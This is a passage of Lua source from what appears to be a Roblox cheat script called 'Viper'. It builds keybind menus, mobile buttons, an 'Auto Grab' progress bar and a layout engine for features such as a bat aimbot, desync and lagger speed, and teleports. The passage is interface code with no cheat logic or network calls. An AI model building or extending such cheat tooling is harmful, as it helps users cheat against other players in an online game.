    subStroke.Color = getThemeColor() or Color3.fromRGB(255, 110, 20)
    subStroke.Thickness = 1
    subStroke.Transparency = 0.5

    local kbSubLayout = Instance.new("UIListLayout", subNavRow)
    kbSubLayout.FillDirection = Enum.FillDirection.Horizontal
    kbSubLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    kbSubLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    kbSubLayout.Padding = UDim.new(0, 8)

    local btnSubKb = Instance.new("TextButton", subNavRow)
    btnSubKb.Size = UDim2.new(0.48, -4, 1, -6)
    btnSubKb.BackgroundColor3 = getThemeColor() or Color3.fromRGB(255, 110, 20)
    btnSubKb.BackgroundTransparency = 0.2
    btnSubKb.Text = "Keybinds"
    btnSubKb.TextColor3 = WHITE
    btnSubKb.Font = Enum.Font.GothamBold
    btnSubKb.TextSize = 12
    btnSubKb.AutoButtonColor = false
    btnSubKb.ZIndex = 9
    Instance.new("UICorner", btnSubKb).CornerRadius = UDim.new(0, 8)

    local btnSubMob = Instance.new("TextButton", subNavRow)
    btnSubMob.Size = UDim2.new(0.48, -4, 1, -6)
    btnSubMob.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
    btnSubMob.BackgroundTransparency = 0.6
    btnSubMob.Text = "Mobile Buttons"
    btnSubMob.TextColor3 = Color3.fromRGB(160, 160, 170)
    btnSubMob.Font = Enum.Font.GothamBold
    btnSubMob.TextSize = 12
    btnSubMob.AutoButtonColor = false
    btnSubMob.ZIndex = 9
    Instance.new("UICorner", btnSubMob).CornerRadius = UDim.new(0, 8)

    local kbContainer = Instance.new("Frame", keyPage)
    kbContainer.Name = "KBContainer"
    kbContainer.Size = UDim2.new(1, 0, 0, 0)
    kbContainer.AutomaticSize = Enum.AutomaticSize.Y
    kbContainer.BackgroundTransparency = 1
    kbContainer.LayoutOrder = getNextOrder(keyPage)
    kbContainer.ZIndex = 7
    local kbContLayout = Instance.new("UIListLayout", kbContainer)
    kbContLayout.SortOrder = Enum.SortOrder.LayoutOrder
    kbContLayout.Padding = UDim.new(0, 6)
    kbContLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

    local mobContainer = Instance.new("Frame", keyPage)
    mobContainer.Name = "MobContainer"
    mobContainer.Size = UDim2.new(1, 0, 0, 0)
    mobContainer.AutomaticSize = Enum.AutomaticSize.Y
    mobContainer.BackgroundTransparency = 1
    mobContainer.LayoutOrder = getNextOrder(keyPage)
    mobContainer.Visible = false
    mobContainer.ZIndex = 7
    local mobContLayout = Instance.new("UIListLayout", mobContainer)
    mobContLayout.SortOrder = Enum.SortOrder.LayoutOrder
    mobContLayout.Padding = UDim.new(0, 6)
    mobContLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

    btnSubKb.MouseButton1Click:Connect(function()
        kbContainer.Visible = true
        mobContainer.Visible = false
        btnSubKb.BackgroundColor3 = getThemeColor() or Color3.fromRGB(255, 110, 20)
        btnSubKb.BackgroundTransparency = 0.2
        btnSubKb.TextColor3 = WHITE
        btnSubMob.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
        btnSubMob.BackgroundTransparency = 0.6
        btnSubMob.TextColor3 = Color3.fromRGB(160, 160, 170)
    end)

    btnSubMob.MouseButton1Click:Connect(function()
        kbContainer.Visible = false
        mobContainer.Visible = true
        btnSubMob.BackgroundColor3 = getThemeColor() or Color3.fromRGB(255, 110, 20)
        btnSubMob.BackgroundTransparency = 0.2
        btnSubMob.TextColor3 = WHITE
        btnSubKb.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
        btnSubKb.BackgroundTransparency = 0.6
        btnSubKb.TextColor3 = Color3.fromRGB(160, 160, 170)
    end)

    -- Inside kbContainer:
    mkSect(kbContainer, "Keybinds")
    do
        local resetRow = mkRow(kbContainer, 40)
        mkLabel(resetRow, "Reset All Keybinds")
        local resetBtn = Instance.new("TextButton", resetRow)
        resetBtn.Size = UDim2.new(0, 92, 0, 24)
        resetBtn.Position = UDim2.new(1, -100, 0.5, -12)
        resetBtn.BackgroundColor3 = Color3.fromRGB(245, 245, 250)
        resetBtn.BorderSizePixel = 0
        resetBtn.Text = "RESET"
        resetBtn.TextColor3 = Color3.fromRGB(170, 30, 50)
        resetBtn.Font = Enum.Font.GothamBold
        resetBtn.TextSize = 11
        resetBtn.ZIndex = 9
        Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0, 7)
        resetBtn.MouseButton1Click:Connect(function()
            for key, value in pairs(DEFAULT_KB) do
                if KB[key] then KB[key].kb = value.kb; KB[key].gp = value.gp end
            end
            for _, ref in ipairs(keyButtonRefs) do
                local entry = ref.entry
                ref.btn.Text = (entry.gp and entry.gp.Name) or (entry.kb and entry.kb.Name) or "None"
            end
            resetBtn.Text = "RESET"
            task.defer(function() saveAllSettings(true) end)
            task.delay(1, function()
                if resetBtn and resetBtn.Parent then resetBtn.Text = "RESET" end
            end)
        end)
    end

    mkSect(kbContainer, "Movement")
    addKeybindRow(kbContainer, "Normal Speed", KB.CarryToggle)
    addKeybindRow(kbContainer, "Lagger Speed", KB.LaggerMode)
    addKeybindRow(kbContainer, "Desync Speed", KB.DesyncTp)
    addKeybindRow(kbContainer, "Auto Left", KB.AutoLeft)
    addKeybindRow(kbContainer, "Auto Right", KB.AutoRight)

    mkSect(kbContainer, "Combat")
    addKeybindRow(kbContainer, "Bat Aimbot", KB.AutoBat)
    addKeybindRow(kbContainer, "Mirror TP Down V2", KB.MirrorTP)


    mkSect(kbContainer, "Utility")
    addKeybindRow(kbContainer, "Drop Brainrot", KB.DropBrainrot)
    addKeybindRow(kbContainer, "Insta Reset", KB.InstaReset)
    addKeybindRow(kbContainer, "TP Down", KB.TPFloor)
    addKeybindRow(kbContainer, "Hide GUI", KB.GuiHide)

    -- Inside mobContainer:
    setShowMobileButtonsVisual = mkToggle(mobContainer, "Show Mobile Buttons", function(on)
        CONFIG.SHOW_MOBILE_BUTTONS = on
        if MobilePanel then MobilePanel.Enabled = on end
    end)
    mkSect(mobContainer, "Mobile Buttons Setup")
    setLockMobileButtonsVisual = mkToggle(mobContainer, "Lock Mobile Buttons", function(on)
        mobileButtonsLocked = on
        task.defer(function() pcall(saveAllSettings) end)
    end)
    local mobItems = {
        {id = "DropBR",    label = "Drop Brainrot"},
        {id = "AutoLeft",  label = "Auto Left"},
        {id = "AutoBat",   label = "Bat Aimbot"},
        {id = "AutoRight", label = "Auto Right"},
        {id = "TpDown",    label = "TP Down"},
        {id = "Carry",     label = "Normal Speed"},
        {id = "Lagger1",   label = "Lagger Normal"},
        {id = "Lagger2",   label = "Lagger Carry"},
        {id = "DesyncSpd", label = "Desync Speed"},
    }
    for _, item in ipairs(mobItems) do
        local r = mkRow(mobContainer, 42)
        mkLabel(r, item.label)
        local actBtn = Instance.new("TextButton", r)
        actBtn.Size = UDim2.new(0, 92, 0, 26)
        actBtn.Position = UDim2.new(1, -100, 0.5, -13)
        actBtn.BorderSizePixel = 0
        actBtn.Font = Enum.Font.GothamBold
        actBtn.TextSize = 11
        actBtn.ZIndex = 9
        actBtn.AutoButtonColor = false
        Instance.new("UICorner", actBtn).CornerRadius = UDim.new(0, 7)

        local function updateBtnVisual()
            local isDel = hiddenMobileButtons[item.id] == true
            if isDel then
                actBtn.Text = "+ ADD"
                actBtn.TextColor3 = WHITE
                actBtn.BackgroundColor3 = Color3.fromRGB(0, 160, 80)
            else
                actBtn.Text = "- DELETE"
                actBtn.TextColor3 = WHITE
                actBtn.BackgroundColor3 = Color3.fromRGB(180, 35, 45)
            end
        end
        updateBtnVisual()

        actBtn.MouseButton1Click:Connect(function()
            local isDel = hiddenMobileButtons[item.id] == true
            if isDel then
                hiddenMobileButtons[item.id] = nil
            else
                hiddenMobileButtons[item.id] = true
            end
            updateBtnVisual()
            local mobPanel = LP:FindFirstChild("PlayerGui") and LP.PlayerGui:FindFirstChild("ViperMobilePanel")
            if not mobPanel then
                pcall(function()
                    mobPanel = game:GetService("CoreGui"):FindFirstChild("ViperMobilePanel")
                end)
            end
            if mobPanel then
                local b = mobPanel:FindFirstChild(item.id)
                if b then b.Visible = (hiddenMobileButtons[item.id] ~= true) end
            end
            task.defer(function() pcall(saveAllSettings) end)
        end)
    end

    -- Mobile button presets are controlled by Settings > UI LAYOUT.

    pbFrame = Instance.new("Frame", gui)
    pbFrame.Name = "ViperAutoGrabBar"
    pbFrame.Size = UDim2.new(0, 340, 0, 66)
    pbFrame.Position = UDim2.new(0.5, -170, 0.80, 0)
    pbFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
    pbFrame.BackgroundTransparency = 0
    pbFrame.BorderSizePixel = 0
    pbFrame.Active = true
    pbFrame.Visible = (CONFIG.AUTO_STEAL_ENABLED == true)
    pbFrame.ZIndex = 500
    pbFrame.ClipsDescendants = false

    pbScale = Instance.new("UIScale", pbFrame)
    -- The progress bar has its own persistent scale, independent of main UI size.
    pbScale.Scale = _clamp(tonumber(autoGrabScale) or 1, 0.30, 2.00)

    if savedProgressBarPos then
        pbFrame.Position = UDim2.new(
            savedProgressBarPos.XScale or 0.5,
            savedProgressBarPos.XOffset or -170,
            savedProgressBarPos.YScale or 0.80,
            savedProgressBarPos.YOffset or 0
        )
    end

    Instance.new("UICorner", pbFrame).CornerRadius = UDim.new(0, 14)

    -- Background gradient (dark glassy)
    local pbPanelGrad = Instance.new("UIGradient", pbFrame)
    pbPanelGrad.Name = "PanelGrad"
    pbPanelGrad.Rotation = 135
    pbPanelGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromRGB(22, 26, 32)),
        ColorSequenceKeypoint.new(0.50, Color3.fromRGB(10, 12, 16)),
        ColorSequenceKeypoint.new(1.00, Color3.fromRGB(6, 7, 10)),
    })

    -- Animated rotating border (matches main UI)
    local pbOuterStroke = Instance.new("UIStroke", pbFrame)
    pbOuterStroke.Name = "OuterStroke"
    pbOuterStroke.Color = getThemeColor()
    pbOuterStroke.Thickness = 1.6
    pbOuterStroke.Transparency = 0
    pbOuterStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    local pbBorderGrad = Instance.new("UIGradient", pbOuterStroke)
    pbBorderGrad.Name = "PbBorderGrad"
    do
        local tc = getThemeColor()
        local dark = tc:Lerp(Color3.fromRGB(0,0,0), 0.85)
        pbBorderGrad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, tc),
            ColorSequenceKeypoint.new(0.30, dark),
            ColorSequenceKeypoint.new(0.60, tc),
            ColorSequenceKeypoint.new(1.00, dark),
        })
    end
    pbBorderGrad.Rotation = 0
    task.spawn(function()
        local r = 0
        while pbFrame and pbFrame.Parent do
            r = (r + 2) % 360
            pbBorderGrad.Rotation = r
            task.wait(0.03)
        end
    end)

    -- Shiny top edge
    local pbTopShine = Instance.new("Frame", pbFrame)
    pbTopShine.Name = "TopShine"
    pbTopShine.Size = UDim2.new(1, -24, 0, 1)
    pbTopShine.Position = UDim2.new(0, 12, 0, 2)
    pbTopShine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    pbTopShine.BackgroundTransparency = 0.82
    pbTopShine.BorderSizePixel = 0
    pbTopShine.ZIndex = 501

    -- LEFT SECTION: title + pct
    local pbLeft = Instance.new("Frame", pbFrame)
    pbLeft.Name = "LeftSection"
    pbLeft.Size = UDim2.new(1, -100, 1, 0)
    pbLeft.Position = UDim2.new(0, 0, 0, 0)
    pbLeft.BackgroundTransparency = 1
    pbLeft.ZIndex = 502

    local pbTitle = Instance.new("TextLabel", pbLeft)
    pbTitle.Name = "Title"
    pbTitle.Size = UDim2.new(1, -14, 0, 18)
    pbTitle.Position = UDim2.new(0, 14, 0, 6)
    pbTitle.BackgroundTransparency = 1
    pbTitle.Text = "AUTO GRAB"
    pbTitle.TextColor3 = getThemeColor()
    pbTitle.Font = Enum.Font.GothamBlack
    pbTitle.TextSize = 10
    pbTitle.TextXAlignment = Enum.TextXAlignment.Left
    pbTitle.ZIndex = 503
    local titleGrad = Instance.new("UIGradient", pbTitle)
    titleGrad.Color = viperGradient(getThemeColor())
    titleGrad.Rotation = 0

    -- Big progress percentage
    progressPct = Instance.new("TextLabel", pbLeft)
    progressPct.Name = "ProgressPct"
    progressPct.Size = UDim2.new(0, 70, 0, 20)
    progressPct.Position = UDim2.new(0, 12, 0, 16)
    progressPct.BackgroundTransparency = 1
    progressPct.Text = "0%"
    progressPct.TextColor3 = Color3.fromRGB(240, 240, 250)
    progressPct.Font = Enum.Font.GothamBlack
    progressPct.TextSize = 16
    progressPct.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    progressPct.TextStrokeTransparency = 0.4
    progressPct.TextXAlignment = Enum.TextXAlignment.Left
    progressPct.ZIndex = 504

    -- Progress track (larger, fills most of bar height)
    local pbBarBg = Instance.new("Frame", pbLeft)
    pbBarBg.Name = "BarBg"
    pbBarBg.Size = UDim2.new(1, -16, 0, 18)
    pbBarBg.Position = UDim2.new(0, 10, 1, -26)
    pbBarBg.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
    pbBarBg.BorderSizePixel = 0
    pbBarBg.ClipsDescendants = true
    pbBarBg.ZIndex = 502
    Instance.new("UICorner", pbBarBg).CornerRadius = UDim.new(0, 8)

    progressFill = Instance.new("Frame", pbBarBg)
    progressFill.Name = "Fill"
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.Position = UDim2.new(0, 0, 0, 0)
    progressFill.BackgroundColor3 = getThemeColor()
    progressFill.BorderSizePixel = 0
    progressFill.ClipsDescendants = true
    progressFill.ZIndex = 503
    Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 8)

    local fillGrad = Instance.new("UIGradient", progressFill)
    fillGrad.Name = "FillGrad"
    fillGrad.Color = viperGradient(getThemeColor())
    fillGrad.Rotation = 0

    -- Shimmer sweep
    local shimmer = Instance.new("Frame", progressFill)
    shimmer.Name = "Shimmer"
    shimmer.Size = UDim2.new(0, 32, 1, 0)
    shimmer.Position = UDim2.new(0, -32, 0, 0)
    shimmer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    shimmer.BackgroundTransparency = 0.5
    shimmer.BorderSizePixel = 0
    shimmer.ZIndex = 504
    local shimmerGrad = Instance.new("UIGradient", shimmer)
    shimmerGrad.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0.00, 1),
        NumberSequenceKeypoint.new(0.50, 0.2),
        NumberSequenceKeypoint.new(1.00, 1),
    })

    -- Shimmer animation
    task.spawn(function()
        while pbFrame and pbFrame.Parent do
            shimmer.Position = UDim2.new(0, -40, 0, 0)
            TS:Create(shimmer, TweenInfo.new(1.4, Enum.EasingStyle.Linear), {
                Position = UDim2.new(1, 10, 0, 0)
            }):Play()
            task.wait(1.4)
        end
    end)

    -- RIGHT SECTION: vertical divider + FPS + Ping
    local pbDivider = Instance.new("Frame", pbFrame)
    pbDivider.Name = "Divider"
    pbDivider.Size = UDim2.new(0, 1, 1, -16)
    pbDivider.Position = UDim2.new(1, -95, 0, 8)
    pbDivider.BackgroundColor3 = getThemeColor()
    pbDivider.BackgroundTransparency = 0.5
    pbDivider.BorderSizePixel = 0
    pbDivider.ZIndex = 505
    Instance.new("UICorner", pbDivider).CornerRadius = UDim.new(1, 0)

    local pbRight = Instance.new("Frame", pbFrame)
    pbRight.Name = "RightSection"
    pbRight.Size = UDim2.new(0, 88, 1, 0)
    pbRight.Position = UDim2.new(1, -93, 0, 0)
    pbRight.BackgroundTransparency = 1
    pbRight.ZIndex = 505

    local fpsNeon = Instance.new("TextLabel", pbRight)
    fpsNeon.Name = "FPSNeon"
    fpsNeon.Size = UDim2.new(1, -8, 0, 16)
    fpsNeon.Position = UDim2.new(0, 8, 0, 10)
    fpsNeon.BackgroundTransparency = 1
    fpsNeon.Text = "-- FPS"
    fpsNeon.TextColor3 = getThemeColor()
    fpsNeon.Font = Enum.Font.GothamBold
    fpsNeon.TextSize = 11
    fpsNeon.TextXAlignment = Enum.TextXAlignment.Center
    fpsNeon.ZIndex = 506

    local pingNeon = Instance.new("TextLabel", pbRight)
    pingNeon.Name = "PingNeon"
    pingNeon.Size = UDim2.new(1, -8, 0, 16)
    pingNeon.Position = UDim2.new(0, 8, 0, 30)
    pingNeon.BackgroundTransparency = 1
    pingNeon.Text = "-- MS"
    pingNeon.TextColor3 = getThemeColor()
    pingNeon.Font = Enum.Font.GothamBold
    pingNeon.TextSize = 11
    pingNeon.TextXAlignment = Enum.TextXAlignment.Center
    pingNeon.ZIndex = 506

    -- Apply the selected Auto Grab progress-bar style after its full UI has been built.
    task.defer(function()
        task.wait(0.1)
        pcall(applyAutoGrabUIVersion, selectedAutoGrabUI)
    end)

    -- Shimmer animation loop

    -- FPS / Ping updater
    task.spawn(function()
        local lastFrame = _tick()
        local fpsSamples = {}
        local fpsAvg = 60
        RunService.RenderStepped:Connect(function()
            local now = _tick()
            local dt = now - lastFrame
            lastFrame = now
            if dt > 0 then
                table.insert(fpsSamples, 1 / dt)
                if #fpsSamples > 30 then table.remove(fpsSamples, 1) end
                local sum = 0
                for _, v in ipairs(fpsSamples) do sum = sum + v end
                fpsAvg = sum / #fpsSamples
            end
        end)
        while pbFrame and pbFrame.Parent do
            local ping = 0
            pcall(function() ping = LP:GetNetworkPing() * 1000 end)
            if fpsNeon then fpsNeon.Text = string.format("%d FPS", _floor(fpsAvg + 0.5)) end
            if pingNeon then pingNeon.Text = string.format("%d MS", _floor(ping + 0.5)) end
            task.wait(0.75)
        end
    end)

    -- Fast dragging for pbFrame (no scale division)
    local pbDragging = false
    local pbDragStart = nil
    local pbStartPos = nil
    pbFrame.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
            pbDragging = true
            pbDragStart = inp.Position
            pbStartPos = pbFrame.Position
            inp.Changed:Connect(function()
                if inp.UserInputState == Enum.UserInputState.End then
                    pbDragging = false
                    task.defer(function() pcall(saveAllSettings) end)
                end
            end)
        end
    end)
    UIS.InputChanged:Connect(function(inp)
        if not pbDragging then return end
        if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
            local delta = inp.Position - pbDragStart
            pbFrame.Position = UDim2.new(
                pbStartPos.X.Scale, pbStartPos.X.Offset + delta.X,
                pbStartPos.Y.Scale, pbStartPos.Y.Offset + delta.Y
            )
        end
    end)
    UIS.InputEnded:Connect(function(inp)
        if (inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch) and pbDragging then
            pbDragging = false
            task.defer(function() pcall(saveAllSettings) end)
        end
    end)

    -- =====================================================================
    -- VIPER UI LAYOUT ENGINE + INDEPENDENT AI NAVIGATOR
    -- No separate editor panel, font picker, or user-drawn mobile shape editor.
    -- =====================================================================
    local function removeHexBands(btn)
        if not btn then return end
        for _, child in ipairs(btn:GetChildren()) do
            if child.Name:match("^ViperHexOuter_") or child.Name:match("^ViperHexInner_") then
                child:Destroy()
            end
        end
    end

    local function createHexBands(btn, name, widths, color, zIndex, inner)
        for i, width in ipairs(widths) do
            local band = Instance.new("Frame")
            band.Name = name .. "_" .. tostring(i)
            band.AnchorPoint = Vector2.new(0.5, 0)
            band.Position = UDim2.new(0.5, 0, (i - 1) / #widths, inner and 2 or 1)
            band.Size = UDim2.new(math.max(0.18, width - (inner and 0.11 or 0)), 0, 1 / #widths, inner and -4 or -2)
            band.BackgroundColor3 = color
            band.BorderSizePixel = 0
            band.Active = false
            band.Selectable = false
            band.ZIndex = zIndex
            band.Parent = btn
        end
    end

    local function updateHexColors(btn, active)
        if not btn then return end
        for _, part in ipairs(btn:GetChildren()) do
            if part:IsA("Frame") and part.Name:match("^ViperHexOuter_") then
                part.BackgroundColor3 = active and Color3.fromRGB(255, 110, 20) or Color3.fromRGB(138, 76, 38)
                part.BackgroundTransparency = active and 0 or 0.28
            elseif part:IsA("Frame") and part.Name:match("^ViperHexInner_") then
                part.BackgroundColor3 = active and Color3.fromRGB(31, 19, 22) or Color3.fromRGB(8, 9, 14)
                part.BackgroundTransparency = 0
            end
        end
    end

    local function applyMobileButtonStyle()
        if not MobilePanel then return end
        for _, btn in ipairs(MobilePanel:GetChildren()) do
            if btn:IsA("TextButton") then
                local corner = btn:FindFirstChildOfClass("UICorner")
                local stroke = btn:FindFirstChildOfClass("UIStroke")
                local label = btn:FindFirstChild("TextLabel")
                removeHexBands(btn)
                if uiLayoutSettings.mobileShape == "Hexagon" then
                    btn.BackgroundTransparency = 1
                    if corner then corner.CornerRadius = UDim.new(0, 0) end
                    if stroke then stroke.Enabled = false end
                    local widths = {0.52, 0.72, 0.92, 1, 1, 0.92, 0.72, 0.52}
                    createHexBands(btn, "ViperHexOuter", widths, Color3.fromRGB(138, 76, 38), btn.ZIndex, false)
                    createHexBands(btn, "ViperHexInner", widths, Color3.fromRGB(8, 9, 14), btn.ZIndex, true)
                    if label then label.ZIndex = btn.ZIndex + 2 end
                    updateHexColors(btn, btn:GetAttribute("MobActive") == true)
                else
                    btn.BackgroundTransparency = 0.05
                    if stroke then stroke.Enabled = true end
                    if label then label.ZIndex = btn.ZIndex + 1 end
                    if corner then
                        if uiLayoutSettings.mobileShape == "Square" then
                            corner.CornerRadius = UDim.new(0, 2)
                        elseif uiLayoutSettings.mobileShape == "Circle" then
                            corner.CornerRadius = UDim.new(1, 0)
                        else
                            corner.CornerRadius = UDim.new(0, 12)
                        end
                    end
                end
                pcall(function() paintFloatingBtn(btn, btn:GetAttribute("MobActive") == true) end)
                if uiLayoutSettings.mobileShape == "Hexagon" then
                    btn.BackgroundTransparency = 1
                    updateHexColors(btn, btn:GetAttribute("MobActive") == true)
                end
            end
        end
    end

    applyUILayoutSettings = function()
        local mainCorner = main and main:FindFirstChildOfClass("UICorner")
        local panelRadius = uiLayoutSettings.panelShape == "Square" and 0 or 16
        if mainCorner then mainCorner.CornerRadius = UDim.new(0, panelRadius) end
        if main then
            for _, layerName in ipairs({"BackgroundImage", "BackgroundShade"}) do
                local layer = main:FindFirstChild(layerName)
                local layerCorner = layer and layer:FindFirstChildOfClass("UICorner")
                if layerCorner then layerCorner.CornerRadius = UDim.new(0, panelRadius) end
            end
        end
        for _, info in ipairs(customRows) do
            local corner = info.row and info.row:FindFirstChildOfClass("UICorner")
            if corner then corner.CornerRadius = UDim.new(0, uiLayoutSettings.panelShape == "Square" and 0 or 11) end
            local row = info.row
            local switch = row and row:FindFirstChild("ToggleSwitch")
            if switch then
                local switchCorner = switch:FindFirstChildOfClass("UICorner")
                if uiLayoutSettings.panelShape == "Square" then
                    switch.Size = UDim2.new(0, 66, 0, 28)
                    if switchCorner then switchCorner.CornerRadius = UDim.new(0, 2) end
                else
                    switch.Size = UDim2.new(0, 60, 0, 26)
                    if switchCorner then switchCorner.CornerRadius = UDim.new(0, 13) end
                end
                local dot = switch:FindFirstChild("SwitchDot")
                if dot and dot:IsA("GuiObject") then
                    local dc = dot:FindFirstChildOfClass("UICorner")
                    if dc then dc.CornerRadius = UDim.new(1, 0) end
                end
            end
        end

        local navLayoutName = uiLayoutSettings.navLayout or "Top"
        if navLayoutName == "Left" or navLayoutName == "Right" then
            local isRight = navLayoutName == "Right"
            tabBar.Position = isRight and UDim2.new(1, -80, 0, 108) or UDim2.new(0, 8, 0, 108)
            tabBar.Size = UDim2.new(0, 72, 1, -116)
            tabBar.BackgroundColor3 = Color3.fromRGB(14, 13, 21)
            tabBar.BackgroundTransparency = 0.16
            tabLayout.FillDirection = Enum.FillDirection.Vertical
            tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
            tabLayout.VerticalAlignment = Enum.VerticalAlignment.Top
            tabLayout.Padding = UDim.new(0, 7)
            local sidebarCorner = tabBar:FindFirstChildOfClass("UICorner")
            if not sidebarCorner then sidebarCorner = Instance.new("UICorner", tabBar) end
            sidebarCorner.CornerRadius = UDim.new(0, uiLayoutSettings.panelShape == "Square" and 0 or 12)
            for _, btn in ipairs(tabButtons) do
                btn.Size = UDim2.new(1, -6, 0, 36)
                btn.TextSize = 9
                local c = btn:FindFirstChildOfClass("UICorner")
                if c then c.CornerRadius = UDim.new(0, uiLayoutSettings.panelShape == "Square" and 0 or 9) end
            end
            tabContent.Position = isRight and UDim2.new(0, 6, 0, 108) or UDim2.new(0, 86, 0, 108)
            tabContent.Size = UDim2.new(1, -92, 1, -112)
        elseif navLayoutName == "Bottom" then
            tabBar.Position = UDim2.new(0, 8, 1, -48)
            tabBar.Size = UDim2.new(1, -16, 0, 40)
            tabBar.BackgroundTransparency = 1
            tabLayout.FillDirection = Enum.FillDirection.Horizontal
            tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
            tabLayout.VerticalAlignment = Enum.VerticalAlignment.Center
            tabLayout.Padding = UDim.new(0, 2)
            for _, btn in ipairs(tabButtons) do
                btn.Size = UDim2.new(1 / #tabButtons, -3, 1, -4)
                btn.TextSize = 8
                local c = btn:FindFirstChildOfClass("UICorner")
                if c then c.CornerRadius = UDim.new(0, uiLayoutSettings.panelShape == "Square" and 0 or 13) end
            end
            tabContent.Position = UDim2.new(0, 6, 0, 108)
            tabContent.Size = UDim2.new(1, -12, 1, -160)
            for _, child in ipairs(tabBar:GetChildren()) do
                if child:IsA("UICorner") then child:Destroy() end
            end
        else -- Top navigation
            tabBar.Position = UDim2.new(0, 8, 0, 64)
            tabBar.Size = UDim2.new(1, -16, 0, 40)
            tabBar.BackgroundTransparency = 1
            tabLayout.FillDirection = Enum.FillDirection.Horizontal
            tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
            tabLayout.VerticalAlignment = Enum.VerticalAlignment.Center
            tabLayout.Padding = UDim.new(0, 2)
            for _, btn in ipairs(tabButtons) do
                btn.Size = UDim2.new(1 / #tabButtons, -3, 1, -4)
                btn.TextSize = 8
                local c = btn:FindFirstChildOfClass("UICorner")
                if c then c.CornerRadius = UDim.new(0, uiLayoutSettings.panelShape == "Square" and 0 or 13) end
            end
            tabContent.Position = UDim2.new(0, 6, 0, 108)
            tabContent.Size = UDim2.new(1, -12, 1, -112)
            for _, child in ipairs(tabBar:GetChildren()) do
                if child:IsA("UICorner") then child:Destroy() end
            end
        end
        applyMobileButtonStyle()
        for _, item in ipairs(uiLayoutChoiceButtons) do
            if item.button and item.button.Parent then
                item.button.Text = tostring(uiLayoutSettings[item.settingKey] or item.options[1]) .. "  ›"
            end
        end
    end

    _G.__VIPER_APPLY_UI_LAYOUT = applyUILayoutSettings

    local function normalizeSearchText(text)
        text = tostring(text or ""):lower()
        text = text:gsub("İ", "i"):gsub("ı", "i"):gsub("ş", "s"):gsub("ğ", "g"):gsub("ü", "u"):gsub("ö", "o"):gsub("ç", "c")
        text = text:gsub("aimbott", "aimbot"):gsub("ambot", "aimbot"):gsub("aim[%s%-]?bot", "aimbot")
        text = text:gsub("bypassaim", "bypass aimbot")
        text = text:gsub("[^%w%s]", " ")
        text = text:gsub("%s+", " ")
        return text
    end

    local searchStopWords = {
        where=true, is=true, the=true, my=true, a=true, an=true, to=true, ["in"]=true, on=true, at=true,
        how=true, ["do"]=true, i=true, find=true, show=true, me=true, please=true, can=true, you=true,
        nerde=true, nerede=true, neresi=true, nerden=true, nereden=true, nasil=true, nasil=true,
        bana=true, bul=true, goster=true, getir=true, ac=true, acabilir=true, misin=true, mi=true,
        bir=true, bu=true, su=true, de=true, da=true, lutfen=true, var=true, acaba=true,
        donde=true, esta=true, el=true, la=true, que=true, como=true, moi=true, ou=true, est=true,
        bitte=true, wo=true, ist=true, ich=true, du=true, le=true, les=true, ouais=true,
    }

    local function getSearchTerms(message)
        local normalized = normalizeSearchText(message)
        local terms = {}
        local seen = {}
        for token in normalized:gmatch("[%w]+") do
            if #token > 1 and not searchStopWords[token] and not seen[token] then
                seen[token] = true
                table.insert(terms, token)
            end
        end
        return normalized, terms
    end

    local function getSearchObjectText(obj)
        local parts = {tostring(obj.Name or "")}
        if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
            table.insert(parts, tostring(obj.Text or ""))
        end
        local rowId = obj:GetAttribute("ViperCustomRowId")
        if rowId ~= nil then table.insert(parts, tostring(rowId)) end
        return normalizeSearchText(table.concat(parts, " "))
    end

    local function getHighlightRoot(obj, page)
        local current = obj
        while current and current ~= page do
            if current:IsA("GuiObject") and current:GetAttribute("ViperCustomRowId") ~= nil then
                return current
            end
            current = current.Parent
        end
        current = obj
        while current and current.Parent and current.Parent ~= page do
            current = current.Parent
        end
        return current or obj
    end

    local function findSearchTargets(query, limit)
        local normalizedQuery = normalizeSearchText(query)
        local _, terms = getSearchTerms(query)
        if #terms == 0 then return {} end
        local resultsByRoot = {}
        local pageOrder = tabs or {"Speed", "Combat", "Visual", "Steal", "Settings", "Keybinds"}
        for _, pageName in ipairs(pageOrder) do
            local page = contentPages[pageName]
            if page then
                for _, obj in ipairs(page:GetDescendants()) do
                    if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
                        local text = getSearchObjectText(obj)
                        local score = 0
                        if normalizedQuery ~= "" and text:find(normalizedQuery, 1, true) then
                            score = score + 14
                        end
                        local matched = 0
                        for _, token in ipairs(terms) do
                            if text:find(token, 1, true) then
                                matched = matched + 1
                                score = score + math.min(6, #token)
                            end
                        end
                        if matched > 0 then
                            local root = getHighlightRoot(obj, page)
                            local prior = resultsByRoot[root]
                            if not prior or score > prior.score then
                                local label = tostring(obj.Text or "")
                                label = label:gsub("%s+", " "):gsub("^%s+", ""):gsub("%s+$", "")
                                if label == "" then label = tostring(obj.Name or root.Name) end
                                resultsByRoot[root] = {
                                    pageName = pageName,
                                    page = page,
                                    object = obj,
                                    root = root,
                                    label = label,
                                    score = score,
                                }
                            end
